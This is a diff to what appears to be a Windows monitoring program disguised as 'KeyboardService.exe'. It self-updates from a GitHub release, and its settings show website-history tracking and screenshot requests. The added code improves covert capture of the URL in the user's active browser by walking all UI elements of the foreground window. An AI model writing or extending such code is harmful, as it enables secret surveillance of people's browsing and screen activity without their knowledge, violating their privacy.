@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.0.9"
+APP_VERSION = "1.0.10"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -244,32 +244,90 @@ def get_active_target():
         return app_name, app_name
 
 
+BROWSER_EXECUTABLES = (
+    "chrome.exe",
+    "msedge.exe",
+    "edge.exe",
+    "firefox.exe",
+    "brave.exe",
+    "opera.exe",
+)
+
+
+def browser_name_from_active_app(app_name):
+    candidate = str(app_name or "").strip()
+    if not candidate:
+        return ""
+    executable = candidate.split(" - ", 1)[0].strip().replace("\\", "/")
+    base_name = os.path.basename(executable).lower().strip()
+    if base_name:
+        normalized_base = base_name.lower()
+        if normalized_base in BROWSER_EXECUTABLES:
+            return normalized_base
+        if normalized_base.endswith(".exe"):
+            return normalized_base
+        if "google chrome" in candidate.lower():
+            return "chrome.exe"
+        if "microsoft edge" in candidate.lower() or "edge" in candidate.lower():
+            return "msedge.exe"
+        if "firefox" in candidate.lower():
+            return "firefox.exe"
+        if "brave" in candidate.lower():
+            return "brave.exe"
+        if "opera" in candidate.lower():
+            return "opera.exe"
+        return base_name
+
+    lowered = candidate.lower()
+    if "google chrome" in lowered:
+        return "chrome.exe"
+    if "microsoft edge" in lowered or "edge" in lowered:
+        return "msedge.exe"
+    if "firefox" in lowered:
+        return "firefox.exe"
+    if "brave" in lowered:
+        return "brave.exe"
+    if "opera" in lowered:
+        return "opera.exe"
+    return ""
+
+
 def get_browser_url(app_name):
     if os.name != "nt" or Desktop is None:
         return ""
-    browser_names = ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
-    executable = app_name.split(" - ", 1)[0].strip().lower()
-    if executable not in browser_names:
+    executable = browser_name_from_active_app(app_name)
+    if executable not in BROWSER_EXECUTABLES:
         return ""
 
     try:
         window = Desktop(backend="uia").get_active()
-        for control in window.descendants(control_type="Edit"):
-            name = " ".join(
-                (
-                    control.window_text(),
-                    control.element_info.name,
-                    control.element_info.automation_id,
-                )
-            ).lower()
-            if not any(marker in name for marker in ("address", "search", "url", "location")):
+        candidate_values = []
+        for control in window.descendants():
+            if control is None:
                 continue
-            value = (control.window_text() or control.element_info.name or "").strip()
-            if not value.startswith(("http://", "https://")):
-                continue
-            parsed = urlparse(value)
-            if parsed.scheme in ("http", "https") and parsed.netloc:
-                return value
+            try:
+                control_type = (control.element_info.control_type or "").lower()
+            except Exception:
+                control_type = ""
+            for value in (
+                control.window_text(),
+                control.element_info.name,
+                control.element_info.automation_id,
+            ):
+                if value is None:
+                    continue
+                text = str(value).strip()
+                if not text:
+                    continue
+                if any(marker in text.lower() for marker in ("address", "search", "url", "location", "omnibox")):
+                    candidate_values.append(text)
+                elif control_type in {"edit", "combobox", "pane", "group", "text"} and text.startswith(("http://", "https://")):
+                    candidate_values.append(text)
+        for value in candidate_values:
+            if value.startswith(("http://", "https://")):
+                parsed = urlparse(value)
+                if parsed.scheme in ("http", "https") and parsed.netloc:
+                    return value
     except Exception:
         return ""
     return ""
